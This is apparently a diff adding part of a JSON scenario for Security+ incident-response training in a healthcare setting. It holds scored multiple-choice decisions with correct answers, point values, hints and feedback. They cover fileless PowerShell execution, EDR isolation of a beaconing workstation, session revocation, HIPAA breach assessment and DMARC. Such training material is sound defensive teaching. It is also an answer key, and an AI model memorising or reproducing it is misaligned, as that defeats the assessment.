+        {
+          "id": "A",
+          "text": "Fileless malware using living-off-the-land binaries (LOLBins)",
+          "is_correct": true,
+          "points": 25,
+          "feedback": {
+            "short": "Correct! Classic fileless/LOLBin technique",
+            "detailed": "This command uses PowerShell (a legitimate Windows binary) to download and execute code directly in memory using Invoke-Expression (IEX). The WebClient object fetches the payload, and IEX executes it without writing to disk. This 'living off the land' approach uses trusted system tools, evades traditional file-based antivirus, and leaves minimal forensic evidence. It's a hallmark of sophisticated attacks.",
+            "consequence": "Understanding the technique informs detection strategies - behavior-based monitoring is essential when attackers use legitimate tools."
+          }
+        },
+        {
+          "id": "B",
+          "text": "Ransomware dropper preparing to encrypt files",
+          "is_correct": false,
+          "points": 5,
+          "feedback": {
+            "short": "Possible but not identifiable from this command alone",
+            "detailed": "While this could be a first-stage loader for ransomware, we can't determine the ultimate payload from just the download command. The command itself is a generic downloader technique - what it downloads (update.ps1) could be ransomware, a RAT, credential stealer, or other malware. The technique itself is fileless execution, regardless of payload.",
+            "consequence": "Assuming ransomware without evidence could trigger unnecessary incident escalation."
+          }
+        },
+        {
+          "id": "C",
+          "text": "Macro-enabled document attack",
+          "is_correct": false,
+          "points": 0,
+          "feedback": {
+            "short": "Incorrect - no document involved",
+            "detailed": "Macro attacks involve malicious code embedded in Office documents (Word, Excel) that execute when macros are enabled. This attack uses a direct PowerShell command executed via a web link, not a document. Different attack vector entirely.",
+            "consequence": "Misidentifying the technique leads to wrong defensive focus."
+          }
+        },
+        {
+          "id": "D",
+          "text": "DLL injection attack",
+          "is_correct": false,
+          "points": 0,
+          "feedback": {
+            "short": "Incorrect - different technique",
+            "detailed": "DLL injection involves inserting malicious code into running processes by loading malicious DLLs. This command is downloading and executing a PowerShell script, not injecting into processes. DLL injection is a persistence/evasion technique, while this is an initial access payload delivery method.",
+            "consequence": "Confusing technique types affects incident analysis accuracy."
+          }
+        }
+      ],
+      "hints": [
+        {
+          "level": 1,
+          "cost": 2,
+          "text": "Consider what the command does: downloads content and executes it using a built-in Windows tool. What's the advantage of this approach?"
+        },
+        {
+          "level": 2,
+          "cost": 5,
+          "text": "LOLBins (Living Off the Land Binaries) are legitimate system tools abused by attackers. PowerShell is one of the most commonly abused because it can download and execute code in memory."
+        }
+      ],
+      "learning_note": "Fileless malware and LOLBin techniques use legitimate system tools (PowerShell, WMI, certutil, mshta) to execute malicious actions without dropping traditional malware files. This evades file-based detection, requiring security teams to focus on behavioral analysis, script logging (PowerShell ScriptBlock logging), and command-line monitoring.",
+      "unlocks_artifact": "artifact_6"
+    },
+    {
+      "id": "decision_7",
+      "sequence": 7,
+      "title": "Critical Escalation",
+      "narrative": "EDR sweep reveals a second compromised user: Tyler Price from Patient Billing. Unlike Morrison whose payload was blocked, Price's workstation shows an active command-and-control (C2) beacon. The C2 communication started 15 minutes ago. Price is currently in a meeting and not responding to calls or Slack.",
+      "question": "What is the IMMEDIATE priority action for the Price workstation?",
+      "options": [
+        {
+          "id": "A",
+          "text": "Wait for Price to respond so you can get permission before taking action on their workstation",
+          "is_correct": false,
+          "points": 0,
+          "feedback": {
+            "short": "Dangerous delay - active breach requires immediate action",
+            "detailed": "With an active C2 beacon, every minute increases the risk of lateral movement, privilege escalation, or data exfiltration. Security incident response procedures should authorize SOC analysts to take immediate containment actions on compromised systems without individual user permission. Waiting allows the attacker to expand their foothold.",
+            "consequence": "15-minute delay allows attacker to potentially move laterally to other systems or exfiltrate sensitive patient billing data."
+          }
+        },
+        {
+          "id": "B",
+          "text": "Network isolate the workstation immediately using EDR remote isolation capabilities",
+          "is_correct": true,
+          "points": 25,
+          "feedback": {
+            "short": "Correct! Immediate containment is critical",
+            "detailed": "EDR platforms like CrowdStrike provide remote network isolation capabilities that sever the machine's network connectivity while maintaining EDR agent communication for forensic purposes. This immediately stops C2 communication and prevents lateral movement without requiring physical access or user interaction. This is the correct response to an active compromise.",
+            "consequence": "C2 channel is severed within seconds, preventing further attacker activity while preserving forensic evidence."
+          }
+        },
+        {
+          "id": "C",
+          "text": "Send a security team member to physically unplug the network cable",
+          "is_correct": false,
+          "points": 15,
+          "feedback": {
+            "short": "Effective but unnecessarily slow",
+            "detailed": "Physical disconnection works but introduces delay - someone must locate Price, reach their workstation, and disconnect. With EDR remote isolation available, this delays containment unnecessarily. Physical intervention should be backup if remote options fail, not the first choice.",
+            "consequence": "5-10 minute delay while someone physically reaches the workstation."
+          }
+        },
+        {
+          "id": "D",
+          "text": "Block the C2 IP address at the firewall to stop communication",
+          "is_correct": false,
+          "points": 10,
+          "feedback": {
+            "short": "Helpful but insufficient",
+            "detailed": "Blocking the known C2 IP is good but sophisticated malware often has backup C2 channels or can receive new C2 addresses. Blocking one IP doesn't prevent the compromised machine from attempting other malicious actions or using alternative communication methods. Full network isolation is more comprehensive.",
+            "consequence": "C2 traffic to known IP stops but malware may have fallback communication methods."
+          }
+        }
+      ],
+      "hints": [
+        {
+          "level": 1,
+          "cost": 2,
+          "text": "Active C2 means the attacker currently has control of this machine. What's the fastest way to sever that connection?"
+        },
+        {
+          "level": 2,
+          "cost": 5,
+          "text": "Modern EDR platforms include network isolation features that can instantly quarantine a machine from the network while maintaining management connectivity."
+        }
+      ],
+      "learning_note": "Network isolation is a critical containment capability. EDR platforms can isolate endpoints remotely, severing all network connectivity except the EDR management channel. This stops active breaches immediately while preserving forensic evidence and maintaining visibility. SOC teams should have pre-authorized procedures for immediate isolation of compromised systems.",
+      "unlocks_artifact": "artifact_7"
+    },
+    {
+      "id": "decision_8",
+      "sequence": 8,
+      "title": "Credential Compromise Response",
+      "narrative": "Both Morrison and Price submitted credentials to the fake login page. Morrison's credentials have been reset. For Price, whose workstation had active malware, you need to consider additional risks. Price has access to the patient billing system containing PHI for over 200,000 patients.",
+      "question": "Beyond password reset, what additional identity-related action is MOST critical for Price's account?",
+      "options": [
+        {
+          "id": "A",
+          "text": "Send an email to Price explaining what happened and asking them to change their password",
+          "is_correct": false,
+          "points": 0,
+          "feedback": {
+            "short": "Completely inadequate response",
+            "detailed": "The password is already compromised and may have been used. Asking the user to change it themselves creates delay and doesn't address active sessions. Additionally, if the attacker has email access, they might see this notification. Security team must force password reset and session revocation immediately.",
+            "consequence": "Attacker potentially maintains access through existing sessions or races to use credentials before user changes password."
+          }
+        },
+        {
+          "id": "B",
+          "text": "Revoke all active sessions and authentication tokens immediately, then force password reset",
+          "is_correct": true,
+          "points": 25,
+          "feedback": {
+            "short": "Correct! Session management is critical",
+            "detailed": "Password reset alone doesn't invalidate existing sessions or tokens. An attacker who captured credentials may have already authenticated and established sessions. Forcing sign-out from all devices and revoking tokens (OAuth, refresh tokens, etc.) ensures the attacker can't maintain access through previously established sessions. This must happen BEFORE or simultaneously with password reset.",
+            "consequence": "All attacker sessions are terminated immediately. Patient billing system access is secured."
+          }
+        },
+        {
+          "id": "C",
+          "text": "Disable the account entirely until the investigation is complete",
+          "is_correct": false,
+          "points": 15,
+          "feedback": {
+            "short": "Overcorrection that impacts operations",
+            "detailed": "While this would be secure, completely disabling accounts creates operational impact - the user can't work at all. Session revocation with password reset achieves security goals while allowing the user to re-authenticate with new credentials. Full account disablement should be reserved for confirmed malicious insiders or if the account itself is suspected of being attacker-created.",
+            "consequence": "Patient billing operations are disrupted. User cannot perform job duties during investigation."
+          }
+        },
+        {
+          "id": "D",
+          "text": "Enable MFA on the account to prevent future unauthorized access",
+          "is_correct": false,
+          "points": 10,
+          "feedback": {
+            "short": "Good for prevention but doesn't address current compromise",
+            "detailed": "MFA is essential for preventing future credential abuse, but it doesn't help with CURRENT compromise. If the attacker has active sessions, MFA won't kick them out. MFA should be implemented as part of hardening AFTER the immediate compromise is contained through session revocation.",
+            "consequence": "Attacker maintains existing sessions while future logins would require MFA."
+          }
+        }
+      ],
+      "hints": [
+        {
+          "level": 1,
+          "cost": 2,
+          "text": "Think about the difference between password authentication and session management. What happens if someone already logged in before the password was changed?"
+        },
+        {
+          "level": 2,
+          "cost": 5,
+          "text": "OAuth tokens, session cookies, and refresh tokens can persist even after password changes. Full session revocation is required to ensure attackers can't maintain access."
+        }
+      ],
+      "learning_note": "Credential compromise response requires both password reset AND session revocation. Modern identity systems maintain multiple authentication artifacts (session cookies, OAuth tokens, refresh tokens, Kerberos tickets) that may persist after password change. Complete response includes: revoke all sessions, invalidate all tokens, force password reset, review for MFA enrollment, and audit access logs for unauthorized activity.",
+      "unlocks_artifact": "artifact_8"
+    },
+    {
+      "id": "decision_9",
+      "sequence": 9,
+      "title": "HIPAA Notification Assessment",
+      "narrative": "Your Compliance Officer asks for your technical assessment: Price had access to the billing system but we don't know if data was actually accessed or exfiltrated. The malware was active for approximately 15 minutes before containment. Compliance needs to determine if this triggers HIPAA breach notification requirements.",
+      "question": "What is the correct technical input for breach determination?",
+      "options": [
+        {
+          "id": "A",
+          "text": "No notification needed - the malware was contained quickly and we have no evidence of data access",
+          "is_correct": false,
+          "points": 5,
+          "feedback": {
+            "short": "Overly optimistic interpretation",
+            "detailed": "HIPAA's breach notification rule presumes a breach occurred unless you can demonstrate a low probability that PHI was compromised. 'No evidence' is different from 'evidence of no access.' Without comprehensive logging proving the attacker didn't access PHI, you can't assume they didn't. The burden is on the organization to prove no breach occurred.",
+            "consequence": "Organization may fail to notify when required, risking significant HIPAA penalties."
+          }
+        },
+        {
+          "id": "B",
+          "text": "Immediately notify HHS and all 200,000 patients as a precaution",
+          "is_correct": false,
+          "points": 10,
+          "feedback": {
+            "short": "Premature without proper assessment",
+            "detailed": "HIPAA requires notification within 60 days of DISCOVERY, allowing time for proper risk assessment. Immediate notification without investigation may be premature and unnecessarily alarming. The proper approach is to conduct forensic analysis to determine the scope, then make informed notification decisions based on evidence.",
+            "consequence": "Premature notification causes patient panic, reputational damage, and potential notification to people whose data wasn't actually at risk."
+          }
+        },
+        {
+          "id": "C",
+          "text": "Conduct forensic analysis of access logs to determine if PHI was accessed, then provide findings for breach assessment",
+          "is_correct": true,
+          "points": 25,
+          "feedback": {
+            "short": "Correct! Evidence-based assessment is required",
+            "detailed": "HIPAA breach determination requires a risk assessment considering: nature and extent of PHI involved, unauthorized person who accessed it, whether PHI was actually viewed or acquired, and extent of risk mitigation. Security's role is to provide forensic evidence: Did the attacker authenticate to the billing system? What queries were run? Was data exported? This evidence drives compliance decisions.",
+            "consequence": "Thorough forensic analysis provides evidence needed for informed breach determination and defensible notification decisions."
+          }
+        },
+        {
+          "id": "D",
+          "text": "This is a compliance decision, not a security decision - defer entirely to the Compliance team",
+          "is_correct": false,
+          "points": 5,
+          "feedback": {
+            "short": "Collaboration is required",
+            "detailed": "While the ultimate breach determination is a compliance/legal decision, security must provide the technical evidence that informs that decision. Compliance can't assess breach probability without knowing what the attacker actually did. Security and compliance must work together - security provides technical findings, compliance applies regulatory interpretation.",
+            "consequence": "Compliance makes decisions without adequate technical information."
+          }
+        }
+      ],
+      "hints": [
+        {
+          "level": 1,
+          "cost": 2,
+          "text": "HIPAA breach notification depends on whether PHI was actually accessed or acquired. How would you determine this?"
+        },
+        {
+          "level": 2,
+          "cost": 5,
+          "text": "Forensic analysis of authentication logs, application access logs, database query logs, and network traffic can establish what the attacker actually did during the 15-minute window."
+        }
+      ],
+      "learning_note": "HIPAA breach determination requires evidence-based risk assessment. Security teams must preserve and analyze logs to determine actual scope: authentication events, application access, database queries, file access, network traffic. This evidence determines whether notification is required and to whom. Organizations must be able to demonstrate their analysis methodology to regulators."
+    },
+    {
+      "id": "decision_10",
+      "sequence": 10,
+      "title": "Lessons Learned Priority",
+      "narrative": "The immediate incident is contained. Two weeks later, you're preparing the lessons learned report. Leadership wants the TOP recommendation for preventing similar attacks. Multiple improvements are possible, but resources are limited.",
+      "question": "What should be the PRIMARY recommendation in your lessons learned report?",
+      "options": [
+        {
+          "id": "A",
+          "text": "Implement mandatory security awareness training for all employees",
+          "is_correct": false,
+          "points": 15,
+          "feedback": {
+            "short": "Important but not the most effective single control",
+            "detailed": "Security awareness training is valuable and should be part of defense-in-depth, but it relies on human judgment under pressure. Some users will always click, especially with sophisticated social engineering. Technical controls that reduce reliance on human judgment are more reliably effective.",
+            "consequence": "Training improves but doesn't eliminate human error. Next sophisticated campaign may still succeed."
+          }
+        },
+        {
+          "id": "B",
+          "text": "Deploy DMARC with p=reject policy to prevent domain impersonation",
+          "is_correct": true,
+          "points": 25,
+          "feedback": {
+            "short": "Correct! Technical control addresses root cause",
+            "detailed": "DMARC with enforcement (p=reject) would have prevented these emails from reaching users entirely. It's a technical control that doesn't rely on user judgment, addresses the specific attack vector exploited, and provides ongoing protection against domain impersonation. While other improvements are valuable, DMARC enforcement provides the highest ROI for preventing this specific attack type.",
+            "consequence": "Future domain impersonation emails are automatically rejected before reaching user inboxes."
+          }
+        },
+        {
+          "id": "C",
+          "text": "Require executive approval for all wire transfers regardless of amount",
+          "is_correct": false,
+          "points": 10,
+          "feedback": {
+            "short": "Useful process control but limited scope",
+            "detailed": "This addresses wire transfer fraud specifically but doesn't address credential harvesting, data theft attempts (like the HR data request), or gift card fraud. It's also a process control that can be socially engineered. Technical controls that prevent the initial compromise have broader protective value.",
+            "consequence": "Wire fraud risk reduced but other attack objectives (credential theft, data exfiltration) remain viable."
+          }
+        },
+        {
+          "id": "D",
+          "text": "Subscribe to a threat intelligence service for earlier domain detection",
+          "is_correct": false,
+          "points": 10,
+          "feedback": {
+            "short": "Helpful but reactive",
+            "detailed": "Threat intelligence for typosquat domain monitoring is valuable for early warning but doesn't prevent attacks - it enables faster detection. The domains in this attack were registered 4-5 days before use; even with monitoring, that's a short window. Prevention (DMARC) is more effective than detection for this attack type.",
+            "consequence": "Earlier awareness of malicious domains but emails may still reach users before blocking can be implemented."
+          }
+        }
+      ],
+      "hints": [
+        {
+          "level": 1,
+          "cost": 2,
+          "text": "Consider what technical control would have prevented these specific emails from reaching users in the first place."
+        },
+        {
+          "level": 2,
+          "cost": 5,
+          "text": "DMARC enforcement tells receiving email servers to reject messages where the displayed From domain doesn't match the authenticated sending domain - this would block typosquatting impersonation attempts."
+        }
+      ],
+      "learning_note": "Post-incident recommendations should prioritize controls that address root causes with technical enforcement over process or awareness improvements. DMARC with p=reject is one of the most effective controls against BEC because it prevents impersonation emails from reaching users regardless of how convincing the content is. Defense-in-depth means implementing multiple layers, but prioritization should favor preventive technical controls.",
+      "unlocks_artifact": "artifact_9"
+    }
+  ],
+  
+  "summary_teaching_points": [
+    {
+      "topic": "Threat Actor Attribution",
+      "key_points": [
+        "BEC groups are organized criminals focused on financial gain through social engineering",
+        "Attribution uses indicators: motivation, sophistication, infrastructure, targeting patterns",
+        "Accurate attribution helps predict behavior and inform response proportionality"
+      ]
+    },
+    {
+      "topic": "Attack Vectors and Techniques",
+      "key_points": [
+        "Typosquatting uses visually similar domains (character substitution) for impersonation",
+        "OSINT provides attackers with targeting intelligence from public sources",
+        "Fileless malware and LOLBins use legitimate tools to evade detection"
+      ]
+    },
+    {
+      "topic": "Indicator Analysis",
+      "key_points": [
+        "Email header analysis reveals authentication failures and true origin",
+        "Timeline reconstruction identifies scope and impact of compromise",
+        "Behavioral indicators (C2 beacons, unusual processes) indicate active threats"
+      ]
+    },
+    {
+      "topic": "Incident Response",
+      "key_points": [
+        "Scope determination drives all response decisions",
+        "Network isolation is the fastest containment for active threats",
+        "Credential compromise requires session revocation, not just password reset"
+      ]
+    },
+    {
+      "topic": "Email Security",
+      "key_points": [
+        "DMARC with p=reject prevents domain impersonation attacks",
+        "SPF and DKIM alone don't prevent lookalike domain attacks",
+        "Technical controls are more reliable than awareness training for preventing BEC"
+      ]
+    }
+  ],
+  
+  "weakness_mapping": {
+    "threat_actors_weak": {
+      "threshold": 2,
+      "indicators": ["decision_3", "decision_4"],
+      "remediation": "D2-REM-001",
+      "description": "Difficulty with threat actor classification and attribution"
+    },
+    "attack_vectors_weak": {
+      "threshold": 2,
+      "indicators": ["decision_2", "decision_5", "decision_6"],
+      "remediation": "D2-REM-002",
+      "description": "Difficulty identifying attack techniques and vectors"
+    },
+    "indicator_analysis_weak": {
+      "threshold": 2,
+      "indicators": ["decision_1", "decision_6", "decision_7"],
+      "remediation": "D2-REM-003",
+      "description": "Difficulty analyzing indicators of compromise"
+    }
+  },
+  
+  "prerequisites": ["D1-SIM-004", "D1-SIM-005"],
+  "unlocks": ["D2-SIM-002", "D2-SIM-003"],
+  
+  "metadata": {
+    "version": "1.0",
+    "created": "2024-02-13",
+    "author": "Security+ Training System",
+    "domain_alignment": "Domain 2: Threats, Vulnerabilities, and Mitigations",
+    "job_role_alignment": ["SOC Analyst", "Security Analyst", "Incident Responder"],
+    "industry_context": "Healthcare - HIPAA regulated environment"
+  }
+}
